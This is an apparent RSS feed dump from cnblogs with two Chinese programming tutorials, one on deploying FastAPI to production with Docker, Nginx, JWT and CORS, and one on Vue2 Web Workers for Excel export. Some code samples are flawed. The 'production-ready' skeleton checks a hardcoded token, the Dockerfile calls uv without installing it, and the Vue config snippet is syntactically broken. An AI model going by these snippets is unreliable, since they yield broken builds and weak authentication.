{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "FastAPI生产部署指南：从服务器配置到网络安全实践",
      "link": "https://www.cnblogs.com/ymtianyu/p/19435881",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ymtianyu/p/19435881\" id=\"cb_post_title_url\" title=\"发布于 2026-01-04 09:22\">\n    <span>FastAPI生产部署指南：从服务器配置到网络安全实践</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文详细介绍了FastAPI应用从开发到生产环境的完整部署流程、核心原理与安全设置。内容包括选择配置ASGI服务器、容器化部署、设置反向代理与HTTPS、监控日志等实战步骤；解析了请求在路由层、服务层和数据层的流向与分层架构；重点阐述了基于OAuth2和JWT的认证授权、输入验证、CORS策略等网络安全配置，并提供了可参考的代码示例。\n    </div>\n<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<div>\n<p>你的FastAPI应用在本地跑得好好的，一到生产环境就各种“水土不服”？据统计，高达<span style=\"color: rgba(186, 55, 42, 1);\">70%</span>的应用性能与安全问题都源于生产环境配置不当。</p>\n<blockquote style=\"padding-left: 16px; margin: 20px 0; color: rgba(102, 102, 102, 1); font-style: italic;\">本文将从实战出发，手把手带你走通FastAPI的生产部署全流程。你将了解：从代码到服务的完整部署步骤、请求在应用内部的<strong style=\"color: rgba(186, 55, 42, 1);\">数据流向与核心原理</strong>，以及至关重要的<strong style=\"color: rgba(186, 55, 42, 1);\">网络安全配置策略</strong>。不止于“怎么做”，更深入“为什么”。</blockquote>\n<h2 style=\"color: rgba(44, 62, 80, 1); padding-bottom: 8px;\">📚 文章目录</h2>\n<p>- 🚀 第一部分：从开发到生产 - 部署实战四步走</p>\n<p>- 🔄 第二部分：深入原理 - 请求的数据流向与分层架构</p>\n<p>- 🛡️ 第三部分：筑牢防线 - 生产环境网络安全设置</p>\n<p>- 💻 第四部分：完整代码参考与总结</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); margin-top: 30px;\">🚀 第一部分：从开发到生产 - 部署实战四步走</h2>\n<p>把FastAPI应用扔到服务器上运行，只是部署的开始。生产环境要求<strong style=\"color: rgba(186, 55, 42, 1);\">高可用、可扩展、易维护</strong>。以下是经过验证的四个核心步骤。</p>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">1. 选择并配置ASGI服务器</h3>\n<p>FastAPI基于ASGI，你需要一个生产级的ASGI服务器。<strong style=\"color: rgba(186, 55, 42, 1);\">Uvicorn</strong>因其高性能是首选，但单纯使用<code>uvicorn main:app</code>并不适合生产。推荐两种模式：</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">Uvicorn多进程模式</strong>：直接启动多个工作进程。</p>\n<pre class=\"language-bash highlighter-hljs\"><code>uvicorn main:app --host 0.0.0.0 --port 8000 --workers 4</code></pre>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">Gunicorn + Uvicorn Worker</strong>：用Gunicorn管理进程，用Uvicorn处理请求，结合两者优势。</p>\n<pre class=\"language-bash highlighter-hljs\"><code>gunicorn main:app --workers 4 --worker-class uvicorn.workers.UvicornWorker --bind 0.0.0.0:8000</code></pre>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">2. 容器化部署（Docker）</h3>\n<p>容器化能解决环境一致性问题，是实现<strong style=\"color: rgba(186, 55, 42, 1);\">“一次构建，到处运行”</strong>的关键。一个标准的Dockerfile示例如下：</p>\n<pre class=\"language-dockerfile highlighter-hljs\"><code>FROM python:3.9-slim\nWORKDIR /app\nCOPY pyproject.toml uv.lock ./\nRUN uv sync --frozen\nCOPY . .\nCMD [\"gunicorn\", \"main:app\", \"--workers\", \"4\", \"--worker-class\", \"uvicorn.workers.UvicornWorker\", \"--bind\", \"0.0.0.0:80\"]</code></pre>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">3. 配置反向代理与HTTPS（Nginx）</h3>\n<p>直接暴露应用服务器是危险的。需要使用<strong style=\"color: rgba(186, 55, 42, 1);\">Nginx</strong>等反向代理，它承担了：</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">SSL/TLS终止</strong>：处理HTTPS加密解密。</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">静态文件服务</strong>：更高效地提供静态资源。</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">负载均衡</strong>：将流量分发到多个后端实例。</p>\n<p>一个简单的Nginx配置片段如下，它监听443端口（HTTPS），并将请求代理给运行在8000端口的FastAPI应用。</p>\n<pre class=\"language-nginx highlighter-hljs\"><code>server {\n    listen 443 ssl;\n    server_name yourdomain.com;\n    ssl_certificate /path/to/your/cert.pem;\n    ssl_certificate_key /path/to/your/key.pem;\n    location / {\n        proxy_pass http://127.0.0.1:8000;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}</code></pre>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">4. 设置监控与日志</h3>\n<p>没有监控的应用如同在黑暗中航行。生产环境必须配置：</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">应用日志</strong>：使用Python的<code>logging</code>模块，并确保日志能被集中收集（如ELK Stack）。</p>\n<p>- <strong style=\"color: rgba(186, 55, 42, 1);\">性能监控</strong>：使用<strong style=\"color: rgba(186, 55, 42, 1);\">Prometheus</strong>收集指标（请求数、延迟、错误率），并用<strong style=\"color: rgba(186, 55, 42, 1);\">Grafana</strong>进行可视化。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); margin-top: 30px;\">🔄 第二部分：深入原理 - 请求的数据流向与分层架构</h2>\n<p>理解请求如何流经你的应用，是进行有效部署和调试的基础。一个结构清晰的FastAPI项目通常遵循以下分层架构：</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">1. 路由层（Routers/Views）</strong>：HTTP请求的入口。负责解析路径、参数，进行初步验证（依赖注入），并调用相应的服务层函数。这里使用Pydantic模型定义输入输出格式。</p>\n<pre class=\"language-python highlighter-hljs\"><code>@router.post(\"/users/\", response_model=UserOut)\nasync def create_user(user_in: UserCreate, db: Session = Depends(get_db)):\n    # 调用服务层\n    return UserService.create_user(db, user_in)</code></pre>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">2. 服务层（Services）</strong>：承载核心业务逻辑。它协调多个数据模型操作，处理事务，是连接路由层和数据层的桥梁。一个好的服务层让你的业务逻辑高度可复用。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">3. 数据访问层（Repository/Models）</strong>：直接与数据库交互。使用SQLAlchemy等ORM定义数据模型，执行CRUD操作。这一层应专注于数据持久化细节。</p>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">完整数据流</strong>：<code>HTTP请求 -&gt; 反向代理(Nginx) -&gt; ASGI服务器(Uvicorn) -&gt; FastAPI路由 -&gt; Pydantic验证 -&gt; 服务层 -&gt; 数据层 -&gt; 数据库 -&gt; 原路返回响应</code>。</p>\n<h2 style=\"color: rgba(44, 62, 80, 1); margin-top: 30px;\">🛡️ 第三部分：筑牢防线 - 生产环境网络安全设置</h2>\n<p>安全不是功能，是基石。以下是保护FastAPI应用必须实施的措施。</p>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">1. 认证与授权（Authentication &amp; Authorization）</h3>\n<p><strong style=\"color: rgba(186, 55, 42, 1);\">认证</strong>解决“你是谁”，<strong style=\"color: rgba(186, 55, 42, 1);\">授权</strong>解决“你能做什么”。对于API，<strong style=\"color: rgba(186, 55, 42, 1);\">OAuth2与JWT</strong>是行业标准。</p>\n<p>实现JWT令牌验证的依赖项示例：</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi.security import OAuth2PasswordBearer\nfrom jose import JWTError, jwt\n\noauth2_scheme = OAuth2PasswordBearer(tokenUrl=\"token\")\nSECRET_KEY = \"your-secret-key\"  # 生产环境应从安全配置读取\n\nasync def get_current_user(token: str = Depends(oauth2_scheme)):\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=[\"HS256\"])\n        username: str = payload.get(\"sub\")\n        if username is None:\n            raise credentials_exception\n    except JWTError:\n        raise credentials_exception\n    return username</code></pre>\n<p>更复杂的授权，如<strong style=\"color: rgba(186, 55, 42, 1);\">基于角色的访问控制（RBAC）</strong>，可以基于JWT中的声明（claims）来实现，精细控制用户对API端点的访问。</p>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">2. 全面的输入验证与输出过滤</h3>\n<p>永远不要信任客户端输入。FastAPI深度集成<strong style=\"color: rgba(186, 55, 42, 1);\">Pydantic</strong>，在路由层即可对请求体、查询参数进行强类型验证。同时，确保响应模型（<code>response_model</code>）只暴露必要的字段，防止敏感数据泄露。</p>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">3. 启用CSRF保护与CORS策略</h3>\n<p>对于涉及浏览器会话的操作，应考虑启用<strong style=\"color: rgba(186, 55, 42, 1);\">CSRF保护</strong>。对于前后端分离的项目，必须正确配置<strong style=\"color: rgba(186, 55, 42, 1);\">CORS</strong>，只允许受信任的前端域名访问你的API。</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi.middleware.cors import CORSMiddleware\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"https://your-frontend.com\"],  # 精确指定，勿用“*”\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)</code></pre>\n<h2 style=\"color: rgba(44, 62, 80, 1); margin-top: 30px;\">💻 第四部分：完整代码参考与总结</h2>\n<p>下面是一个整合了上述部分概念的生产就绪<code>main.py</code>文件骨架：</p>\n<pre class=\"language-python highlighter-hljs\"><code>from fastapi import FastAPI, Depends, HTTPException\nfrom fastapi.security import OAuth2PasswordBearer\nfrom pydantic import BaseModel\nimport logging\n\n# 配置日志\nlogger = logging.getLogger(__name__)\n\napp = FastAPI(title=\"生产环境FastAPI示例\")\n\n# 1. 定义Pydantic模型\nclass ItemCreate(BaseModel):\n    name: str\n    price: float\n\nclass ItemOut(BaseModel):\n    id: int\n    name: str\n    price: float\n\n# 2. 模拟数据库和服务层\nfake_db = []\nclass ItemService:\n    @staticmethod\n    def create_item(item_in: ItemCreate):\n        logger.info(f\"尝试创建商品: {item_in.name}\")\n        # 模拟保存到数据库并生成ID\n        item_dict = item_in.dict()\n        item_dict['id'] = len(fake_db) + 1\n        fake_db.append(item_dict)\n        return item_dict\n\n# 3. 依赖项：简单的OAuth2令牌验证（示例）\noauth2_scheme = OAuth2PasswordBearer(tokenUrl=\"token\")\ndef verify_token(token: str = Depends(oauth2_scheme)):\n    # 此处应包含完整的JWT验证逻辑\n    if token != \"fake-super-secret-token\":\n        raise HTTPException(status_code=403, detail=\"无效的令牌\")\n    return token\n\n# 4. 受保护的路由\n@app.post(\"/items/\", response_model=ItemOut)\nasync def create_item(\n    item: ItemCreate,\n    token: str = Depends(verify_token)  # 依赖项用于认证\n):\n    \"\"\"\n    创建新商品。需要有效的Bearer Token。\n    \"\"\"\n    new_item = ItemService.create_item(item)\n    return new_item\n\nif __name__ == \"__main__\":\n    import uvicorn\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)</code></pre>\n<h3 style=\"color: rgba(58, 109, 140, 1);\">总结</h3>\n<p>将FastAPI成功部署到生产环境，是一个涵盖<strong style=\"color: rgba(186, 55, 42, 1);\">服务器配置、架构理解和安全加固</strong>的系统工程。核心要点在于：使用<strong style=\"color: rgba(186, 55, 42, 1);\">Gunicorn+Uvicorn</strong>或类似组合作为应用服务器，通过<strong style=\"color: rgba(186, 55, 42, 1);\">Nginx</strong>提供HTTPS和反向代理，采用<strong style=\"color: rgba(186, 55, 42, 1);\">清晰的MVC/分层架构</strong>组织代码，并强制实施以<strong style=\"color: rgba(186, 55, 42, 1);\">OAuth2/JWT</strong>为核心的认证授权机制。遵循这些实践，你的FastAPI应用将能在生产环境中稳定、高效、安全地运行。</p>\n<p style=\"text-align: center; color: rgba(136, 136, 136, 1); font-size: 0.95em; margin-top: 20px;\">喜欢本文？不要错过✨，点赞👍收藏⭐关注我👆，一起学习更多有用的知识，完善你我的技能树！也请路过的大佬给些建议和指教👉👈🥺！</p>\n</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-04 09:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/ymtianyu\">曲幽</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "js中worker的详细讲解",
      "link": "https://www.cnblogs.com/IwishIcould/p/19377799",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/IwishIcould/p/19377799\" id=\"cb_post_title_url\" title=\"发布于 2026-01-04 09:03\">\n    <span>js中worker的详细讲解</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h4 id=\"什么是-javascript-worker\">什么是 JavaScript Worker？</h4>\n<p>Worker 是在Web应用程序中实现多线程的机制。<br />\n它可以在一个单独的线程中运行脚本，独立于主线程。<br />\n这样，我们可以将一些耗时的计算任务交给Worker线程处理。<br />\n以保证主线程的不会被阻塞。</p>\n<h4 id=\"为什么需要worker\">为什么需要Worker？</h4>\n<p>由于JavaScript是单线程的，所有任务在一个线程上执行。<br />\n如果遇到一个耗时的任务（比如大规模数据计算、图像处理、复杂算法）。<br />\n它会阻塞主线程导致页面无法响应，用户体验变差。<br />\nWorker的出现就是为了解决这个问题，将耗时的计算任务放到后台线程去执行。</p>\n<h3 id=\"vue2中如何使用-worker\">vue2中如何使用 worker</h3>\n<p>在vue/cli脚手架中，我们无法直接使用worker。<br />\n因为：<br />\n1，无法将 Worker 脚本打包为独立的可加载文件。<br />\n2，打包后会导致依赖丢失或路径错误。</p>\n<pre><code>npm install worker-loader -D\n或者\nyarn add worker-loader -D\n</code></pre>\n<h4 id=\"vueconfigjs-配置如下\">vue.config.js 配置如下</h4>\n<pre><code>module.exports = {\n  chainWebpack:config=&gt;{\n    // 下面是worker的配置\n    .rule('worker')\n    .test(/\\.worker\\.js$/)\n    .use('worker-loader')\n    .loader('worker-loader')\n    .end();\n\n    // 解决：worker 热更新问题\n    config.module.rule('js').exclude.add(/\\.worker\\.js$/);\n  },\n  parallel: false,\n  chainWebpack: config =&gt; {\n    // 解决：“window is undefined”报错，这个是因为worker线程中不存在window对象，因此不能直接使用，要用this代替\n    config.output.globalObject('this')\n  }\n}\n</code></pre>\n<h4 id=\"postmessage-子线程给主线发送消息\">postMessage 子线程给主线发送消息</h4>\n<p>self.postMessage子线程向主线程发送消息。<br />\n在 Web Worker 中，self 指向当前创建的这个 worker 线程，self 是一个全局对象。<br />\nself.postMessage()将数据从 worker 线程发送到创建它的主线程。</p>\n<h4 id=\"主线程通知子线程worker开始工作\">主线程通知子线程(worker)开始工作</h4>\n<pre><code>// 创建 worker\nthis.webWorker = new Worker('./web.worker.js')\n// 通知 Worker 子线程可以进行响应的工作。\n// 主线程调用worker.postMessage()方法，向 Worker 发消息\nthis.webWorker.postMessage({ action: 'startFetch' });\n</code></pre>\n<h4 id=\"worker-中来发送网络请求哈\">worker 中来发送网络请求哈</h4>\n<p>src\\views\\element.vue 文件</p>\n<pre><code>&lt;template&gt;\n  &lt;div class=\"page\"&gt;\n    &lt;h1&gt;使用worker来发发送网络请求&lt;/h1&gt;\n    &lt;el-button @click=\"sendFetchHandler\"&gt;开始发送网络请求&lt;/el-button&gt;\n\n    &lt;ul&gt;\n      &lt;li v-for=\"(item,index) in apiBackData\" :key=\"index\"&gt;{{ item.title }}&lt;/li&gt;\n    &lt;/ul&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n// 导入 worker 文件, 必须使用 这样的方式引入\nimport WorkerA from 'worker-loader!./web.worker.js'\nexport default {\n  data() {\n    return {\n      apiBackData: []\n    }\n  },\n  methods: {\n    sendFetchHandler(){\n      // 主线程调用worker.postMessage()方法，向 Worker线程 发消息,开始进行网络请求\n      this.webWorker1.postMessage({ action: 'startFetch' });\n    }\n  },\n  created() {\n    // 创建 worker 实例，名称必须和导入时的保持一致\n    this.webWorker1 = new WorkerA('./web.worker.js')\n    // 先添加事件监听器\n    this.webWorker1.addEventListener('message', (e) =&gt; {\n      // e.data 是接收到的数据\n      console.log('收到来自 Worker 的消息:', e.data)\n      // 处理 Worker 返回的数据\n      if (e.data.type === 'fetchSuccess') {\n        this.apiBackData = e.data.data.data || []\n        console.log('获取的数据:',  this.apiBackData );\n      } else if (e.data.type === 'fetchError') {\n        console.log('获取数据失败:', e.data.error);\n      }\n    })\n\n    this.webWorker1.addEventListener('error', (error) =&gt; {\n      console.error('Worker发生错误:', error)\n    })\n  }\n}\n&lt;/script&gt;\n</code></pre>\n<pre><code>// 引入网络请求中的方法\nimport {getList} from '@/request/api.js'\n\nself.onmessage = function(e) {\n  console.log(\"worker:\", e)\n  if(e.data &amp;&amp; e.data.action==='startFetch'){\n    //  e.data是主线程发送过来的数据\n    getList().then(res=&gt;{\n      console.log(1111,res)\n      // 假设 是一个数组就是请求成功\n      if(Array.isArray(res)){\n        //将数据从 worker 线程发送到创建它的主线程\n        self.postMessage({ \n          type: 'fetchSuccess',\n          data:{\n            data:res,\n            message: '获取成功'\n          }\n        });\n      }else{\n        // 将数据从 worker 线程发送到创建它的主线程\n        self.postMessage({ type: 'fetchError', error: '请求失败' });\n      }\n    })\n  }\n};\n</code></pre>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251221111952362-1403369349.png\" /></p>\n<h4 id=\"worker导出表格案例\">worker导出表格案例</h4>\n<pre><code>&lt;template&gt;\n  &lt;div class=\"page\"&gt;\n    &lt;input type=\"text\"&gt;\n    &lt;br/&gt;\n    &lt;el-button @click=\"exportExcelHandler\"&gt;导出excel&lt;/el-button&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\nimport {writeFile, utils} from 'xlsx'\nexport default {\n  data() {\n    return {\n      \n    }\n  },\n  methods: {\n    exportExcelHandler(){\n      let arr = []\n      // 50w行的数据\n      for(let i= 0; i&lt;500000;i++){\n        arr.push({\n          name: '张' + i,\n          age: 18,\n          sex: '男',\n          id: '2025_12_12'+ i,\n          address:'XX区YYY大道' + i + '号'\n        })\n      }\n      // 将对象数组 arr 转换为 Excel 工作表(sheet)\n      const sheet  = utils.json_to_sheet(arr)\n      // 创建一个新的空工作簿对象。\n      // 工作簿是 Excel 文件的容器，可以包含多个工作表\n      const workbook = utils.book_new()\n      // 将之前创建的工作表 sheet 添加到工作簿 workbook 中\n      utils.book_append_sheet(workbook, sheet, 'sheet1')\n      console.log('workbook', workbook)\n      // 将整个工作簿 workbook 写入文件并触发浏览器下载\n      writeFile(workbook, 'test.xlsx')\n      // 主线程调用worker.postMessage()方法，向 Worker线程 发消息,开始进行网络请求\n      // this.webWorker1.postMessage({ action: 'startFetch', data: this.vueData });\n    }\n  }\n}\n&lt;/script&gt;\n</code></pre>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251221175954856-1704295092.png\" /></p>\n<h4 id=\"现在我们使用worker来解决添加数据耗时的问题\">现在我们使用worker来解决添加数据耗时的问题</h4>\n<p>下载xlsx模块。</p>\n<pre><code>npm install --save xlsx\n</code></pre>\n<p>使用worker的文件(下载的主页面)</p>\n<pre><code>&lt;template&gt;\n  &lt;div class=\"page\"&gt;\n    &lt;input type=\"text\"&gt;\n    &lt;br/&gt;\n    &lt;el-button @click=\"exportExcelHandler\"&gt;导出excel&lt;/el-button&gt;\n\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n// 导入 worker 文件, 必须使用 这样的方式引入\nimport WorkerA from 'worker-loader!./web.worker.js'\nimport {writeFile} from 'xlsx'\nexport default {\n  data() {\n    return {\n      \n    }\n  },\n  methods: {\n    exportExcelHandler(){\n      // 主线程调用worker.postMessage()方法，向 Worker线程 发消息,开始进行构造数据\n      this.webWorker1.postMessage({ action: 'startCreateExcelData'});\n    }\n  },\n  created() {\n    // 创建 worker 实例，名称必须和导入时的保持一致\n    this.webWorker1 = new WorkerA('./web.worker.js')\n    // 先添加事件监听器\n    this.webWorker1.addEventListener('message', (e) =&gt; {\n      console.log('收到来自 Worker 的消息:', e.data)\n      // 处理 Worker 返回的数据\n      if (e.data.type === 'createExcelSuccess') {\n        // 返回表的数据\n        const workbook = e.data.data.data\n        // 将整个工作簿 workbook 写入文件并触发浏览器下载。\n        // 最后异步仍然会卡顿,因为数据量太大了.但是卡顿的时间会比之前好一些\n        writeFile(workbook, '通过worker导处excel.xlsx')\n      } else  {\n        console.log('获取数据失败:', e.data.error);\n      }\n    })\n\n    this.webWorker1.addEventListener('error', (error) =&gt; {\n      console.error('Worker发生错误:', error)\n    })\n  }\n}\n&lt;/script&gt;\n</code></pre>\n<p>worker文件(src\\views\\web.worker.js )</p>\n<pre><code>// 引入 xlsx\nimport {utils} from 'xlsx'\nself.onmessage = function(e) {\n  console.log(\"worker:\", e)\n  if(e.data &amp;&amp; e.data.action==='startCreateExcelData'){\n    //  e.data是主线程发送过来的数据\n    let arr = []\n    // 50w行的数据\n    for(let i= 0; i&lt;500000;i++){\n      arr.push({\n        name: '张' + i,\n        age: 18,\n        sex: '男',\n        id: '2025_12_12'+ i,\n        address:'XX区YYY大道' + i + '号'\n      })\n    }\n    // 将对象数组 arr 转换为 Excel 工作表(sheet)\n    const sheet  = utils.json_to_sheet(arr)\n    // 创建一个新的空工作簿(book)对象。工作簿是 Excel 文件的容器，可以包含多个工作表(sheet)\n    const workbook = utils.book_new()\n    // 将之前创建的工作表 (sheet) 添加到工作簿(workbook)中\n    utils.book_append_sheet(workbook, sheet, 'sheet1')\n    self.postMessage({ \n      type: 'createExcelSuccess',\n      data:{\n        data:workbook,\n        message: '获取成功'\n      }\n    });\n  }\n};\n</code></pre>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223192441700-1399729196.png\" /></p>\n<h4 id=\"关闭-web-worker\">关闭 Web Worker</h4>\n<p>在主线程和在Worker线程的关闭方式是不一样的。<br />\n如果在主线程，调用terminate()方法关闭</p>\n<pre><code>this.webWorker1 = new WorkerA('./web.worker.js') \nthis.webWorker1.terminate();\n</code></pre>\n<p>如果是在Work线程，可以调用close()方法进行关闭</p>\n<pre><code>self.close();\n</code></pre>\n<h4 id=\"主线程关闭-worker-线程的说明\">主线程关闭 worker 线程的说明</h4>\n<p>当主线程调用worker.terminate()时，Worker线程会被立即终止。<br />\n无论当前事件循环中是否有任务，包括微任务和宏任务，都不会继续执行。<br />\n也就是说：如果我在点击[导入excel]按钮后，马上又关闭点击[关闭worker]，那么不能够正常导出表格。<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223192230075-108196709.png\" /></p>\n<h4 id=\"worker线程内部关闭-worker-线程的说明\">Worker线程内部关闭 worker 线程的说明</h4>\n<p>当Worker线程内部调用self.close()时，Worker线程并不会立即终止。<br />\n它会[继续执行当前]事件循环中的任务，但是[会阻止后续]事件循环的任务执行。<br />\n也就是说：如果我在点击[导入excel]按钮后，马上又关闭点击[Worker内部关闭Worker]，仍然可以导出表格。<br />\n<img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1425695/202512/1425695-20251223193947537-1923756412.png\" /></p>\n<h4 id=\"判断用户浏览器是否支持-worker\">判断用户浏览器是否支持 worker</h4>\n<pre><code>if (typeof Worker !== 'undefined') {\n  console.log('浏览器支持 Web Workers');\n} else {\n  console.log('浏览器不支持 Web Workers');\n}\n</code></pre>\n<h4 id=\"worker-线程引用其他js文件\">Worker 线程引用其他js文件</h4>\n<p>有些时候，我们需要在worker文件中，引入其他模块的文件。<br />\n可以通过 importScripts() 方法来实现，在 worker 中导入其他的模块。这个地址是可以跨域的。</p>\n<h4 id=\"worker-指定模块类型\">Worker 指定模块类型</h4>\n<p>如果我们发现我们需要导出的方法使用的是ESModule 模式导出。<br />\n此时使用 importScripts() 方法引入他模块，会报错。<br />\n此时需要指定模块类型。</p>\n<pre><code>// main.js（主线程的代码）\nconst worker = new Worker('/worker.js', {\n    type: 'module'  // 指定 worker.js 的类型\n});\n</code></pre>\n<pre><code>// worker.js（worker线程的代码）\nimport add from './utils.js'; // 导入外部js\n\nself.addEventListener('message', e =&gt; { \n    postMessage(e.data);\n});\n\nadd(1, 2);\n</code></pre>\n<pre><code>// utils.js 使用了ESModule 模块导出的 add 方法\nexport default add = (a, b) =&gt; a + b;\n</code></pre>\n<h4 id=\"使用worker的注意事项\">使用worker的注意事项</h4>\n<p>1，worker不能使用window上的dom操作，也不能获取dom对象,dom相关的东西只有主线程有。worker只能做一些计算相关的操作<br />\n2，有的东西是无法通过主线程传递个子线程的。<br />\n比如：方法，dom节点，一些对象里的特殊设置(freeze,getter,setter这些)所以vue的响应式对象在传递之后就会变成普通对象</p>\n<h4 id=\"worker实际应用案例\">worker实际应用案例</h4>\n<p>1，将语法检查、代码压缩等任务放在 Worker 中执行<br />\n2，图像处理：比如使用Canvas处理图片，进行滤镜</p>\n<h4 id=\"worker性能优化建议\">worker性能优化建议</h4>\n<p>减少通信开销：避免频繁传递大量数据，必要时使用 Transferable Objects（如 ArrayBuffer）<br />\n批量处理：对于大批量任务，可批量创建 Worker 并行处理<br />\n常驻线程：对于频繁使用的 Worker，可保持常驻而非重复创建<br />\n错误处理：始终监听 onerror 事件，捕获 Worker 内部的异常</p>\n\n</div>\n<div id=\"MySignature\">\n    <div>\n            <h1 style=\"font-size: 24px;\"> 遇见问题，这是你成长的机会，如果你能够解决，这就是收获。 </h1>\n\t\t    <div style=\"padding: 10px;\">\n\t\t        作者：<a href=\"https://www.cnblogs.com/IwishIcould/\" target=\"_blank\">晚来南风晚相识</a> <br />\n\t\t        出处：<a href=\"https://www.cnblogs.com/IwishIcould/\">https://www.cnblogs.com/IwishIcould/</a> <br />\n                        <p> 想问问题，打赏了卑微的博主，求求你备注一下的扣扣或者微信；这样我好联系你；(っ•̀ω•́)っ✎⁾⁾！</p>\n\t\t        <p>如果觉得这篇文章对你有小小的帮助的话，记得在右下角点个“推荐”哦，或者关注博主，在此感谢！</p>\n\t\t        <p> 万水千山总是情，打赏5毛买辣条行不行，所以如果你心情还比较高兴，也是可以扫码打赏博主(っ•̀ω•́)っ✎⁾⁾！</p>\n                        <p> 想问问题，打赏了卑微的博主，求求你备注一下的扣扣或者微信；这样我好联系你；(っ•̀ω•́)っ✎⁾⁾！</p>\n\t\t\t\t<div style=\"display: flex;\">\n\t\t\t\t\t<div style=\"margin-right: 100px; text-align: center;\">\n\t\t\t\t\t\t<img src=\"//images.cnblogs.com/cnblogs_com/IwishIcould/1900124/t_201214043958支付宝收款码.jpg?a=1607924145179\" />\n\t\t\t\t\t\t<div>\n\t\t\t\t\t\t\t支付宝\n\t\t\t\t\t\t</div>\n\t\t\t\t\t</div>\n\t\t\t\t\t<div style=\"text-align: center;\">\n\t\t\t\t\t\t<img src=\"//images.cnblogs.com/cnblogs_com/IwishIcould/1900124/t_20121604194271E6E296CCB71A007F4E22073D5EB64A.jpg\" />\n\t\t\t\t\t\t<div>微信</div>\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t        本文版权归作者所有，欢迎转载，未经作者同意须保留此段声明，在文章页面明显位置给出原文连接 <br />\n\t\t        如果文中有什么错误，欢迎指出。以免更多的人被误导。 <br />\n               \n\t\t    </div>\n           \n            \n\t\t</div>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-04 09:03</span>&nbsp;\n<a href=\"https://www.cnblogs.com/IwishIcould\">南风晚来晚相识</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "《一个程序猿的生命周期》-《发展篇》- 49.从写代码、到开发软件产品、再到开拓前端市场，2025年是转型关键的一年",
      "link": "https://www.cnblogs.com/blog470130547/p/19435739",
      "published": "",
